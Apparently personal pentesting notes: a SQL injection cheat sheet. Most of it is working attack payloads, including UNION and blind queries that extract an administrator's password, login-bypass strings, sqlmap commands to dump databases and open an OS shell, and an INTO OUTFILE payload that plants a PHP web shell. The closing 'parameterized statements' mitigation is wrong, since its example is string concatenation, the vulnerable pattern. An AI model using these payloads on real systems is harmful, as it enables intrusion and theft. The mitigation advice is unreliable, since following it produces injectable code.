
# Detecting SQL Injection

* Burp Suite Vulnerability Scanner
* Submitting the single quote character ' and looking for errors or other anomalies.
* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
* Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
* Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
* Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

# Get length for SQLi

`injection = '\'+UNION+SELECT+\'a\'+FROM+users+WHERE+username=\'administrator\'+AND+length(password)>6--'`

# Blind SQLi with intruder

```
Cookie: TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'AND+substring(password,ยง1ยง,1)='ยงaยง'-- session=OhKrN5E6NilqEpEC5yiGObZNHY13MjUT
```
Payload 1: 0-9 (or whatever length for the password)
Payload2: all the characters that can be in a password


# SQL Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet


*Break outside of the single quote to be able to inject SQL using a single quote.
*Add a OR keyword to make sure the comparison is always true.
*Add our always true comparison: 1=1
*Comment out the remaining query using -- (the space at the end matters) or #.

## Determine number of columns required for UNION attack

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

# Retrieve multiple values within a single column

Oracle:

' UNION SELECT username || '~' || password FROM users--

## sqlmap crawl  
```
sqlmap -u http://10.10.10.10 --crawl=1
```
## sqlmap dump database
```  
sqlmap -u http://10.10.10.10 --dbms=mysql --dump
```
## sqlmap shell  
```
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell
```

## Upload php command injection file
```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

## Load file
```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```



##Bypasses
### Try with ' " or `
### Use LIMIT if dev limits response to one
### NO SPACE use tabulation /t (haven't tried it)
https://support.portswigger.net/customer/portal/articles/2590739-sql-injection-bypassing-common-filters-

From ^ use comments instead of spaces
`admin'/**/OR/**/1=1#`


```
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
' or 1#
' or 1=1 --
' or 1=1 -- -
```



#### Mitigation

* Parameterized Statements

  ```
  SELECT * FROM users WHERE email = "" + email + "";
  ```

